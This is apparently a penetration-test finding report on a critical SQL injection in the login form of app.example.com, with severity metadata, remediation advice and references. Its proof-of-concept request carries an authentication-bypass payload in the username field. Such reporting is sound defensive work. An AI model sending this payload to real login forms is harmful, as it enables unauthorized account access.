---
id: F-001
title: SQL Injection in Login Form
severity: critical
cvss: "9.8"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
cwe: "CWE-89"
owasp: "A03:2021"
status: open
affected_assets:
  - https://app.example.com/login
tags: [injection, authentication, p1]
---

## Description

The login endpoint is vulnerable to SQL injection via the `username` parameter.

## Proof of Concept

```http
POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'-- &password=anything
```

![Login bypass screenshot](../assets/screenshots/sqli-bypass.png)

## Impact

An attacker can authenticate as any user, including administrators.

## Remediation

Use parameterized queries.

## References

- https://owasp.org/Top10/A03_2021-Injection/
